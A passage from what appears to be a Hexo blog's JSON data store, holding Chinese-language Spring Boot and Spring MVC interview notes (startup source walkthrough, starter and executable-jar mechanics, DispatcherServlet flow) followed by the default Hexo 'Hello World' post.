执行刷新容器后的后置处理逻辑，注意这里为空方法</span></span><br><span class=\"line\">      afterRefresh(context, applicationArguments);</span><br><span class=\"line\">      <span class=\"comment\">// 停止stopWatch计时</span></span><br><span class=\"line\">      stopWatch.stop();</span><br><span class=\"line\">      <span class=\"comment\">// 打印springboot的启动时常</span></span><br><span class=\"line\">      <span class=\"keyword\">if</span> (<span class=\"built_in\">this</span>.logStartupInfo) &#123;</span><br><span class=\"line\">         <span class=\"keyword\">new</span> <span class=\"title class_\">StartupInfoLogger</span>(<span class=\"built_in\">this</span>.mainApplicationClass).logStarted(getApplicationLog(), stopWatch);</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      <span class=\"comment\">// 触发SpringApplicationRunListener的started方法，通知spring容器已经启动</span></span><br><span class=\"line\">      listeners.started(context);</span><br><span class=\"line\">      <span class=\"comment\">// 调用ApplicationRunner和CommandLineRunner的run方法，实现spring容器启动后需要做的一些东西</span></span><br><span class=\"line\">      callRunners(context, applicationArguments);</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\">   <span class=\"comment\">// 若上面的方法抛出异常，将异常添加到exceptionReporters集合中，并抛出 IllegalStateException 异常。</span></span><br><span class=\"line\">   <span class=\"keyword\">catch</span> (Throwable ex) &#123;</span><br><span class=\"line\">      handleRunFailure(context, ex, exceptionReporters, listeners);</span><br><span class=\"line\">      <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> <span class=\"title class_\">IllegalStateException</span>(ex);</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">   <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">      <span class=\"comment\">// 当容器刷新完毕等，触发SpringApplicationRunListeners数组的running方法</span></span><br><span class=\"line\">      listeners.running(context);</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\">   <span class=\"keyword\">catch</span> (Throwable ex) &#123;</span><br><span class=\"line\">      <span class=\"comment\">// 若上面的方法抛出异常，将异常添加到exceptionReporters集合中，并抛出 IllegalStateException 异常。</span></span><br><span class=\"line\">      handleRunFailure(context, ex, exceptionReporters, <span class=\"literal\">null</span>);</span><br><span class=\"line\">      <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> <span class=\"title class_\">IllegalStateException</span>(ex);</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\">   <span class=\"keyword\">return</span> context;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure></li>\n</ul>\n<h2 id=\"怎么让Spring把Body变成一个对象\"><a href=\"#怎么让Spring把Body变成一个对象\" class=\"headerlink\" title=\"怎么让Spring把Body变成一个对象\"></a>怎么让Spring把Body变成一个对象</h2><ul>\n<li>@RequestBody注解原理</li>\n<li>详细看springmvc的处理流程</li>\n</ul>\n<h2 id=\"SpringBoot的starter实现原理是什么？\"><a href=\"#SpringBoot的starter实现原理是什么？\" class=\"headerlink\" title=\"SpringBoot的starter实现原理是什么？\"></a>SpringBoot的starter实现原理是什么？</h2><p>原理就是因为在@EnableAutoConfiguration注解，会自动的扫描jar包下的META-INF&#x2F;spring.factories文件的配置类，写在这里面的类都是需要被自动加载的</p>\n<p>将configuration类中定义的bean加入spring到容器中。就相当于加载之前我们自己配置组件的xml文件。而现在SpringBoot自己定义了一个默认的值，然后直接加载进入了Spring容器。</p>\n<p>SpringBoot提供的自动配置依赖模块都以spring-boot-starter-为命名前缀，并且这些依赖都在org.springframework.boot下。 所有的spring-boot-starter都有约定俗成的默认配置，但允许调整这些配置调整默认的行为。</p>\n<h2 id=\"spring-和springboot的区别\"><a href=\"#spring-和springboot的区别\" class=\"headerlink\" title=\"spring 和springboot的区别\"></a>spring 和springboot的区别</h2><p>Spring Boot基本上是Spring框架的扩展，它消除了设置Spring应用程序所需的XML配置，为更快，更高效的开发生态系统铺平了道路。</p>\n<p>Spring Boot中的一些特征：</p>\n<ul>\n<li>创建独立的Spring应用。</li>\n<li>嵌入式Tomcat、Jetty、 Undertow容器（无需部署war文件）。</li>\n<li>提供的starters 简化构建配置</li>\n<li>尽可能自动配置spring应用。</li>\n<li>提供生产指标,例如指标、健壮检查和外部化配置</li>\n<li>完全没有代码生成和XML配置要求</li>\n</ul>\n<p>Maven依赖</p>\n<p>首先，让我们看一下使用Spring创建Web应用程序所需的最小依赖项</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>org.springframework<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>spring-web<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">version</span>&gt;</span>5.1.0.RELEASE<span class=\"tag\">&lt;/<span class=\"name\">version</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>org.springframework<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>spring-webmvc<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">version</span>&gt;</span>5.1.0.RELEASE<span class=\"tag\">&lt;/<span class=\"name\">version</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>与Spring不同，Spring Boot只需要一个依赖项来启动和运行Web应用程序：</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>org.springframework.boot<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>spring-boot-starter-web<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">version</span>&gt;</span>2.0.6.RELEASE<span class=\"tag\">&lt;/<span class=\"name\">version</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>在进行构建期间，所有其他依赖项将自动添加到项目中。</p>\n<p>另一个很好的例子就是测试库。我们通常使用Spring Test，JUnit，Hamcrest和Mockito库。在Spring项目中，我们应该将所有这些库添加为依赖项。但是在Spring Boot中，我们只需要添加spring-boot-starter-test依赖项来自动包含这些库。</p>\n<p>spring在运行前需要使用xml文件做很多配置，而springboot帮我们实现了这些配置的自动加载，基于注解和简单的yml配置即可</p>\n<p>spring的web程序还是打包为war然后再Tomcat里运行，而springboot内嵌了Tomcat直接打成可运行的jar</p>\n<h2 id=\"Spring-Boot-可执行-Jar-包运行原理\"><a href=\"#Spring-Boot-可执行-Jar-包运行原理\" class=\"headerlink\" title=\"Spring Boot 可执行 Jar 包运行原理\"></a>Spring Boot 可执行 Jar 包运行原理</h2><p>Spring Boot 有一个很方便的功能就是可以将应用打成可执行的 Jar。那么大家有没想过这个 Jar 是怎么运行起来的呢？本篇博客就来介绍下 Spring Boot 可执行 Jar 包的运行原理。</p>\n<h3 id=\"打可执行-Jar-包\"><a href=\"#打可执行-Jar-包\" class=\"headerlink\" title=\"打可执行 Jar 包\"></a>打可执行 Jar 包</h3><p>将 Spring Boot 应用打成可执行 Jar包很容易，只需要在 pom 中加上一个 Spring Boot 提供的插件，然后在执行mvn package即可</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">build</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">plugins</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">plugin</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>org.springframework.boot<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>spring-boot-maven-plugin<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;/<span class=\"name\">plugin</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">plugins</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">build</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>运行完mvn package后，我们会在 target 目录下看到两个 jar 文件。myproject-0.0.1-SNAPSHOT.jar 和 myproject-0.0.1-SNAPSHOT.jar.original。第一个 jar 文件就是我们应用的可执行 jar 包，第二个 Jar 文件是应用原始的 jar 包。</p>\n<h3 id=\"可执行-Jar-包内部结构\"><a href=\"#可执行-Jar-包内部结构\" class=\"headerlink\" title=\"可执行 Jar 包内部结构\"></a>可执行 Jar 包内部结构</h3><figure class=\"highlight text\"><table><tr><td class=\"code\"><pre><span class=\"line\">可执行 jar 目录结构</span><br><span class=\"line\">├─BOOT-INF</span><br><span class=\"line\">│  ├─classes</span><br><span class=\"line\">│  └─lib</span><br><span class=\"line\">├─META-INF</span><br><span class=\"line\">│  ├─maven</span><br><span class=\"line\">│  ├─app.properties</span><br><span class=\"line\">│  ├─MANIFEST.MF      </span><br><span class=\"line\">└─org</span><br><span class=\"line\">    └─springframework</span><br><span class=\"line\">        └─boot</span><br><span class=\"line\">            └─loader</span><br><span class=\"line\">                ├─archive</span><br><span class=\"line\">                ├─data</span><br><span class=\"line\">                ├─jar</span><br><span class=\"line\">                └─util</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>我们先来重点关注两个地方：META-INF 下面的 Jar 包描述文件和 BOOT-INF 这个目录。</p>\n<figure class=\"highlight properties\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">Manifest-Version</span>: <span class=\"string\">1.0</span></span><br><span class=\"line\"><span class=\"attr\">Archiver-Version</span>: <span class=\"string\">Plexus Archiver</span></span><br><span class=\"line\"><span class=\"attr\">Built-By</span>: <span class=\"string\">xxxx</span></span><br><span class=\"line\"><span class=\"attr\">Start-Class</span>: <span class=\"string\">com.xxxx.AppServer</span></span><br><span class=\"line\"><span class=\"attr\">Spring-Boot-Classes</span>: <span class=\"string\">BOOT-INF/classes/</span></span><br><span class=\"line\"><span class=\"attr\">Spring-Boot-Lib</span>: <span class=\"string\">BOOT-INF/lib/</span></span><br><span class=\"line\"><span class=\"attr\">Spring-Boot-Version</span>: <span class=\"string\">2.1.6.RELEASE</span></span><br><span class=\"line\"><span class=\"attr\">Created-By</span>: <span class=\"string\">Apache Maven 3.3.9</span></span><br><span class=\"line\"><span class=\"attr\">Build-Jdk</span>: <span class=\"string\">1.8.0_73</span></span><br><span class=\"line\"><span class=\"attr\">Main-Class</span>: <span class=\"string\">org.springframework.boot.loader.JarLauncher</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>在上面我们看到一个熟悉的配置Main-Class: org.springframework.boot.loader.JarLauncher。我们大概能猜到这个类是整个系统的入口。</p>\n<p>再看下 BOOT-INF 这个目录下面，我们会发现里面是我们项目打出来的 class 文件和项目依赖的 Jar 包。看到这里，你可能已经猜到 Spring Boot 是怎么启动项目的了。</p>\n<h3 id=\"JarLauncher\"><a href=\"#JarLauncher\" class=\"headerlink\" title=\"JarLauncher\"></a>JarLauncher</h3><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">JarLauncher</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">ExecutableArchiveLauncher</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">static</span> <span class=\"keyword\">final</span> <span class=\"type\">String</span> <span class=\"variable\">BOOT_INF_CLASSES</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;BOOT-INF/classes/&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">static</span> <span class=\"keyword\">final</span> <span class=\"type\">String</span> <span class=\"variable\">BOOT_INF_LIB</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;BOOT-INF/lib/&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">public</span> <span class=\"title function_\">JarLauncher</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">protected</span> <span class=\"title function_\">JarLauncher</span><span class=\"params\">(Archive archive)</span> &#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">super</span>(archive);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"meta\">@Override</span></span><br><span class=\"line\">\t<span class=\"keyword\">protected</span> <span class=\"type\">boolean</span> <span class=\"title function_\">isNestedArchive</span><span class=\"params\">(Archive.Entry entry)</span> &#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (entry.isDirectory()) &#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">return</span> entry.getName().equals(BOOT_INF_CLASSES);</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> entry.getName().startsWith(BOOT_INF_LIB);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">        <span class=\"comment\">//项目入口，重点在launch这个方法中</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">new</span> <span class=\"title class_\">JarLauncher</span>().launch(args);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//launch方法</span></span><br><span class=\"line\"><span class=\"keyword\">protected</span> <span class=\"keyword\">void</span> <span class=\"title function_\">launch</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">    JarFile.registerUrlProtocolHandler();</span><br><span class=\"line\">    <span class=\"comment\">//创建LaunchedURLClassLoader。如果根类加载器和扩展类加载器没有加载到某个类的话，就会通过LaunchedURLClassLoader这个加载器来加载类。这个加载器会从Boot-INF下面的class目录和lib目录下加载类。</span></span><br><span class=\"line\">    <span class=\"type\">ClassLoader</span> <span class=\"variable\">classLoader</span> <span class=\"operator\">=</span> createClassLoader(getClassPathArchives());</span><br><span class=\"line\">    <span class=\"comment\">//这个方法会读取jar描述文件中的Start-Class属性，然后通过反射调用到这个类的main方法。</span></span><br><span class=\"line\">    launch(args, getMainClass(), classLoader);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>简单总结</p>\n<ul>\n<li>Spring Boot 可执行 Jar 包的入口点是 JarLauncher 的 main 方法；</li>\n<li>这个方法的执行逻辑是先创建一个 LaunchedURLClassLoader，这个加载器加载类的逻辑是：先判断根类加载器和扩展类加载器能否加载到某个类，如果都加载不到就从 Boot-INF 下面的 class 和 lib 目录下去加载；</li>\n<li>读取Start-Class属性，通过反射机制调用启动类的 main 方法，这样就顺利调用到我们开发的 Spring Boot 主启动类的 main 方法了。</li>\n</ul>\n"},{"title":"Springmvc最热点面试题","date":"2024-05-26T14:54:57.000Z","_content":"\n\n\n\n## 流程\n![流程图](./2024/05/26/Springmvc最热点面试题/1.png)\n## 执行流程\n1. **用户发送请求至前端控制器DispatcherServlet**\n    1. DispatcherServlet：前端控制器。用户请求到达前端控制器，它就相当于mvc模式中的c，dispatcherServlet是整个流程控制的中心，由它调用其它组件处理用户的请求，dispatcherServlet的存在降低了组件之间的耦合性,系统扩展性提高。由框架实现\n    2. doService doDispatch(request, response);\n2. **DispatcherServlet收到请求调用处理器映射器HandlerMapping**\n    1. HandlerMapping：处理器映射器。HandlerMapping负责根据用户请求的url找到Handler即处理器，springmvc提供了不同的映射器实现不同的映射方式，根据一定的规则去查找,例如：xml配置方式，实现接口方式，注解方式等。由框架实现\n3. **处理器映射器根据请求url找到具体的处理器，生成处理器执行链HandlerExecutionChain(包括处理器对象和处理器拦截器)一并返回给DispatcherServlet**\n4. **DispatcherServlet根据处理器Handler获取处理器适配器HandlerAdapter执行HandlerAdapter处理一系列的操作，如：参数封装，数据格式转换，数据验证等操作**\n    1. Handler：处理器。Handler 是继DispatcherServlet前端控制器的后端控制器，在DispatcherServlet的控制下Handler对具体的用户请求进行处理。由于Handler涉及到具体的用户业务请求，所以一般情况需要程序员根据业务需求开发Handler。\n    2. 将http报文转换为对象\n        1. HttpMessageConverter接口\n            1. `canRead` http->object\n            2. `canWrite` 对象的序列化输出\n        2. HttpMessageConverter有很多的实现类，根据HTTP协议的Accept和Content-Type属性，以及参数数据类型来判别使用哪一种HttpMessageConverter\n5. **执行处理器Handler(Controller，也叫页面控制器)**\n6. **Handler执行完成返回ModelAndView**\n7. **HandlerAdapter将Handler执行结果ModelAndView返回到DispatcherServlet**\n    1. HandlAdapter：处理器适配器。通过HandlerAdapter对处理器进行执行，这是适配器模式的应用，通过扩展适配器可以对更多类型的处理器进行执行。由框架实现。\n8. **DispatcherServlet将ModelAndView传给ViewReslover视图解析器**\n    1. ModelAndView是springmvc的封装对象，将model和view封装在一起\n9. **ViewReslover解析后返回具体View**\n    1. ViewResolver：视图解析器。ViewResolver负责将处理结果生成View视图，ViewResolver首先根据逻辑视图名解析成物理视图名即具体的页面地址，再生成View视图对象，最后对View进行渲染将处理结果通过页面展示给用户\n10. **DispatcherServlet对View进行渲染视图（即将模型数据model填充至视图中）**\n    1. View:是springmvc的封装对象，是一个接口, springmvc框架提供了很多的View视图类型，包括：jspview，pdfview,jstlView、freemarkerView、pdfView等。一般情况下需要通过页面标签或页面模版技术将模型数据通过页面展示给用户，需要由程序员根据业务需求开发具体的页面。\n11. **DispatcherServlet响应用户**","source":"_posts/Springmvc最热点面试题.md","raw":"---\ntitle: Springmvc最热点面试题\ndate: 2024-05-26 22:54:57\ntags: springmvc\ncategories: 面试\n---\n\n\n\n\n## 流程\n![流程图](./2024/05/26/Springmvc最热点面试题/1.png)\n## 执行流程\n1. **用户发送请求至前端控制器DispatcherServlet**\n    1. DispatcherServlet：前端控制器。用户请求到达前端控制器，它就相当于mvc模式中的c，dispatcherServlet是整个流程控制的中心，由它调用其它组件处理用户的请求，dispatcherServlet的存在降低了组件之间的耦合性,系统扩展性提高。由框架实现\n    2. doService doDispatch(request, response);\n2. **DispatcherServlet收到请求调用处理器映射器HandlerMapping**\n    1. HandlerMapping：处理器映射器。HandlerMapping负责根据用户请求的url找到Handler即处理器，springmvc提供了不同的映射器实现不同的映射方式，根据一定的规则去查找,例如：xml配置方式，实现接口方式，注解方式等。由框架实现\n3. **处理器映射器根据请求url找到具体的处理器，生成处理器执行链HandlerExecutionChain(包括处理器对象和处理器拦截器)一并返回给DispatcherServlet**\n4. **DispatcherServlet根据处理器Handler获取处理器适配器HandlerAdapter执行HandlerAdapter处理一系列的操作，如：参数封装，数据格式转换，数据验证等操作**\n    1. Handler：处理器。Handler 是继DispatcherServlet前端控制器的后端控制器，在DispatcherServlet的控制下Handler对具体的用户请求进行处理。由于Handler涉及到具体的用户业务请求，所以一般情况需要程序员根据业务需求开发Handler。\n    2. 将http报文转换为对象\n        1. HttpMessageConverter接口\n            1. `canRead` http->object\n            2. `canWrite` 对象的序列化输出\n        2. HttpMessageConverter有很多的实现类，根据HTTP协议的Accept和Content-Type属性，以及参数数据类型来判别使用哪一种HttpMessageConverter\n5. **执行处理器Handler(Controller，也叫页面控制器)**\n6. **Handler执行完成返回ModelAndView**\n7. **HandlerAdapter将Handler执行结果ModelAndView返回到DispatcherServlet**\n    1. HandlAdapter：处理器适配器。通过HandlerAdapter对处理器进行执行，这是适配器模式的应用，通过扩展适配器可以对更多类型的处理器进行执行。由框架实现。\n8. **DispatcherServlet将ModelAndView传给ViewReslover视图解析器**\n    1. ModelAndView是springmvc的封装对象，将model和view封装在一起\n9. **ViewReslover解析后返回具体View**\n    1. ViewResolver：视图解析器。ViewResolver负责将处理结果生成View视图，ViewResolver首先根据逻辑视图名解析成物理视图名即具体的页面地址，再生成View视图对象，最后对View进行渲染将处理结果通过页面展示给用户\n10. **DispatcherServlet对View进行渲染视图（即将模型数据model填充至视图中）**\n    1. View:是springmvc的封装对象，是一个接口, springmvc框架提供了很多的View视图类型，包括：jspview，pdfview,jstlView、freemarkerView、pdfView等。一般情况下需要通过页面标签或页面模版技术将模型数据通过页面展示给用户，需要由程序员根据业务需求开发具体的页面。\n11. **DispatcherServlet响应用户**","slug":"Springmvc最热点面试题","published":1,"updated":"2024-05-26T14:56:36.694Z","comments":1,"layout":"post","photos":[],"_id":"clylh1ry6000rbsuh0qgm54pr","content":"<h2 id=\"流程\"><a href=\"#流程\" class=\"headerlink\" title=\"流程\"></a>流程</h2><p><img src=\"/./2024/05/26/Springmvc%E6%9C%80%E7%83%AD%E7%82%B9%E9%9D%A2%E8%AF%95%E9%A2%98/1.png\" alt=\"流程图\"></p>\n<h2 id=\"执行流程\"><a href=\"#执行流程\" class=\"headerlink\" title=\"执行流程\"></a>执行流程</h2><ol>\n<li><strong>用户发送请求至前端控制器DispatcherServlet</strong><ol>\n<li>DispatcherServlet：前端控制器。用户请求到达前端控制器，它就相当于mvc模式中的c，dispatcherServlet是整个流程控制的中心，由它调用其它组件处理用户的请求，dispatcherServlet的存在降低了组件之间的耦合性,系统扩展性提高。由框架实现</li>\n<li>doService doDispatch(request, response);</li>\n</ol>\n</li>\n<li><strong>DispatcherServlet收到请求调用处理器映射器HandlerMapping</strong><ol>\n<li>HandlerMapping：处理器映射器。HandlerMapping负责根据用户请求的url找到Handler即处理器，springmvc提供了不同的映射器实现不同的映射方式，根据一定的规则去查找,例如：xml配置方式，实现接口方式，注解方式等。由框架实现</li>\n</ol>\n</li>\n<li><strong>处理器映射器根据请求url找到具体的处理器，生成处理器执行链HandlerExecutionChain(包括处理器对象和处理器拦截器)一并返回给DispatcherServlet</strong></li>\n<li><strong>DispatcherServlet根据处理器Handler获取处理器适配器HandlerAdapter执行HandlerAdapter处理一系列的操作，如：参数封装，数据格式转换，数据验证等操作</strong><ol>\n<li>Handler：处理器。Handler 是继DispatcherServlet前端控制器的后端控制器，在DispatcherServlet的控制下Handler对具体的用户请求进行处理。由于Handler涉及到具体的用户业务请求，所以一般情况需要程序员根据业务需求开发Handler。</li>\n<li>将http报文转换为对象<ol>\n<li>HttpMessageConverter接口<ol>\n<li><code>canRead</code> http-&gt;object</li>\n<li><code>canWrite</code> 对象的序列化输出</li>\n</ol>\n</li>\n<li>HttpMessageConverter有很多的实现类，根据HTTP协议的Accept和Content-Type属性，以及参数数据类型来判别使用哪一种HttpMessageConverter</li>\n</ol>\n</li>\n</ol>\n</li>\n<li><strong>执行处理器Handler(Controller，也叫页面控制器)</strong></li>\n<li><strong>Handler执行完成返回ModelAndView</strong></li>\n<li><strong>HandlerAdapter将Handler执行结果ModelAndView返回到DispatcherServlet</strong><ol>\n<li>HandlAdapter：处理器适配器。通过HandlerAdapter对处理器进行执行，这是适配器模式的应用，通过扩展适配器可以对更多类型的处理器进行执行。由框架实现。</li>\n</ol>\n</li>\n<li><strong>DispatcherServlet将ModelAndView传给ViewReslover视图解析器</strong><ol>\n<li>ModelAndView是springmvc的封装对象，将model和view封装在一起</li>\n</ol>\n</li>\n<li><strong>ViewReslover解析后返回具体View</strong><ol>\n<li>ViewResolver：视图解析器。ViewResolver负责将处理结果生成View视图，ViewResolver首先根据逻辑视图名解析成物理视图名即具体的页面地址，再生成View视图对象，最后对View进行渲染将处理结果通过页面展示给用户</li>\n</ol>\n</li>\n<li><strong>DispatcherServlet对View进行渲染视图（即将模型数据model填充至视图中）</strong><ol>\n<li>View:是springmvc的封装对象，是一个接口, springmvc框架提供了很多的View视图类型，包括：jspview，pdfview,jstlView、freemarkerView、pdfView等。一般情况下需要通过页面标签或页面模版技术将模型数据通过页面展示给用户，需要由程序员根据业务需求开发具体的页面。</li>\n</ol>\n</li>\n<li><strong>DispatcherServlet响应用户</strong></li>\n</ol>\n","cover":"/img/liushui.png","cover_type":"img","excerpt":"","more":"<h2 id=\"流程\"><a href=\"#流程\" class=\"headerlink\" title=\"流程\"></a>流程</h2><p><img src=\"/./2024/05/26/Springmvc%E6%9C%80%E7%83%AD%E7%82%B9%E9%9D%A2%E8%AF%95%E9%A2%98/1.png\" alt=\"流程图\"></p>\n<h2 id=\"执行流程\"><a href=\"#执行流程\" class=\"headerlink\" title=\"执行流程\"></a>执行流程</h2><ol>\n<li><strong>用户发送请求至前端控制器DispatcherServlet</strong><ol>\n<li>DispatcherServlet：前端控制器。用户请求到达前端控制器，它就相当于mvc模式中的c，dispatcherServlet是整个流程控制的中心，由它调用其它组件处理用户的请求，dispatcherServlet的存在降低了组件之间的耦合性,系统扩展性提高。由框架实现</li>\n<li>doService doDispatch(request, response);</li>\n</ol>\n</li>\n<li><strong>DispatcherServlet收到请求调用处理器映射器HandlerMapping</strong><ol>\n<li>HandlerMapping：处理器映射器。HandlerMapping负责根据用户请求的url找到Handler即处理器，springmvc提供了不同的映射器实现不同的映射方式，根据一定的规则去查找,例如：xml配置方式，实现接口方式，注解方式等。由框架实现</li>\n</ol>\n</li>\n<li><strong>处理器映射器根据请求url找到具体的处理器，生成处理器执行链HandlerExecutionChain(包括处理器对象和处理器拦截器)一并返回给DispatcherServlet</strong></li>\n<li><strong>DispatcherServlet根据处理器Handler获取处理器适配器HandlerAdapter执行HandlerAdapter处理一系列的操作，如：参数封装，数据格式转换，数据验证等操作</strong><ol>\n<li>Handler：处理器。Handler 是继DispatcherServlet前端控制器的后端控制器，在DispatcherServlet的控制下Handler对具体的用户请求进行处理。由于Handler涉及到具体的用户业务请求，所以一般情况需要程序员根据业务需求开发Handler。</li>\n<li>将http报文转换为对象<ol>\n<li>HttpMessageConverter接口<ol>\n<li><code>canRead</code> http-&gt;object</li>\n<li><code>canWrite</code> 对象的序列化输出</li>\n</ol>\n</li>\n<li>HttpMessageConverter有很多的实现类，根据HTTP协议的Accept和Content-Type属性，以及参数数据类型来判别使用哪一种HttpMessageConverter</li>\n</ol>\n</li>\n</ol>\n</li>\n<li><strong>执行处理器Handler(Controller，也叫页面控制器)</strong></li>\n<li><strong>Handler执行完成返回ModelAndView</strong></li>\n<li><strong>HandlerAdapter将Handler执行结果ModelAndView返回到DispatcherServlet</strong><ol>\n<li>HandlAdapter：处理器适配器。通过HandlerAdapter对处理器进行执行，这是适配器模式的应用，通过扩展适配器可以对更多类型的处理器进行执行。由框架实现。</li>\n</ol>\n</li>\n<li><strong>DispatcherServlet将ModelAndView传给ViewReslover视图解析器</strong><ol>\n<li>ModelAndView是springmvc的封装对象，将model和view封装在一起</li>\n</ol>\n</li>\n<li><strong>ViewReslover解析后返回具体View</strong><ol>\n<li>ViewResolver：视图解析器。ViewResolver负责将处理结果生成View视图，ViewResolver首先根据逻辑视图名解析成物理视图名即具体的页面地址，再生成View视图对象，最后对View进行渲染将处理结果通过页面展示给用户</li>\n</ol>\n</li>\n<li><strong>DispatcherServlet对View进行渲染视图（即将模型数据model填充至视图中）</strong><ol>\n<li>View:是springmvc的封装对象，是一个接口, springmvc框架提供了很多的View视图类型，包括：jspview，pdfview,jstlView、freemarkerView、pdfView等。一般情况下需要通过页面标签或页面模版技术将模型数据通过页面展示给用户，需要由程序员根据业务需求开发具体的页面。</li>\n</ol>\n</li>\n<li><strong>DispatcherServlet响应用户</strong></li>\n</ol>\n"},{"title":"Hello World","_content":"Welcome to [Hexo](https://hexo.io/)! This is your very first post. Check [documentation](https://hexo.io/docs/) for more info. If you get any problems when using Hexo, you can find the answer in [troubleshooting](https://hexo.io/docs/troubleshooting.html) or you can ask me on [GitHub](https://github.com/hexojs/hexo/issues).\n\n## Quick Start\n\n### Create a new post\n\n``` bash\n$ hexo new \"My New Post\"\n```\n\nMore info: [Writing](https://hexo.io/docs/writing.html)\n\n### Run server\n\n``` bash\n$ hexo server\n```\n\nMore info: [Server](https://hexo.io/docs/server.html)\n\n### Generate static files\n\n``` bash\n$ hexo generate\n```\n\nMore info: [Generating](https://hexo.io/docs/generating.html)\n\n### Deploy to remote sites\n\n``` bash\n$ hexo deploy\n```\n\nMore info: [Deployment](https://hexo.io/docs/one-command-deployment.html)\n","source":"_posts/hello-world.md","raw":"---\ntitle: Hello World\n---\nWelcome to [Hexo](https://hexo.io/)! This is your very first post. Check [documentation](https://hexo.io/docs/) for more info. If you get any problems when using Hexo, you can find the answer in [troubleshooting](https://hexo.io/docs/troubleshooting.html) or you can ask me on 